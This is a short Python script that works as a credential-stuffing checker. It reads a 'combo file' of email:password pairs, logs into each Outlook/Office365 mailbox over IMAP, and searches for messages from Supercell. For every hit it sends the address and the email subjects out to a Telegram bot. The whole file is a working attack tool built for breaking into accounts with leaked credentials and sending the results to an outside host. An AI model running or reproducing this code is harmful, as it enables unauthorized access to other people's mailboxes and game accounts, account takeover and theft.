import imaplib
import email
from email.header import decode_header
import os
import requests

def send_to_telegram(bot_token, chat_id, message):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': message
    }
    try:
        requests.post(url, data=payload, timeout=10)
    except Exception as e:
        print(f"[!] Telegram error: {e}")

def check_account(email_address, password, bot_token, chat_id):
    try:
        imap = imaplib.IMAP4_SSL("outlook.office365.com")
        imap.login(email_address, password)
        imap.select("inbox")

        status, messages = imap.search(None, 'FROM "supercell"')
        mail_ids = messages[0].split()

        if mail_ids:
            message = f"[✅] {email_address}: Found {len(mail_ids)} message(s) from Supercell.\nSubjects:\n"
            for mail_id in mail_ids:
                status, msg_data = imap.fetch(mail_id, "(RFC822)")
                for response_part in msg_data:
                    if isinstance(response_part, tuple):
                        msg = email.message_from_bytes(response_part[1])
                        subject, encoding = decode_header(msg["Subject"])[0]
                        if isinstance(subject, bytes):
                            subject = subject.decode(encoding if encoding else "utf-8")
                        message += f" - {subject}\n"
            print(message)
            send_to_telegram(bot_token, chat_id, message)
        else:
            print(f"[-] {email_address}: No messages from Supercell.")

        imap.logout()
    except imaplib.IMAP4.error:
        print(f"[❌] {email_address}: Login failed.")
    except Exception as e:
        print(f"[⚠️] {email_address}: Error - {e}")

def main():
    bot_token = input("Enter your Telegram Bot Token: ").strip()
    chat_id = input("Enter your Telegram Chat ID: ").strip()
    file_path = input("Enter path to combo file (email:password format): ").strip()

    if not os.path.exists(file_path):
        print("[!] File not found.")
        return

    with open(file_path, "r") as file:
        accounts = file.readlines()

    for account in accounts:
        account = account.strip()
        if ":" in account:
            email_address, password = account.split(":", 1)
            check_account(email_address, password, bot_token, chat_id)
        else:
            print(f"[!] Invalid format: {account}")

if __name__ == "__main__":
    main()
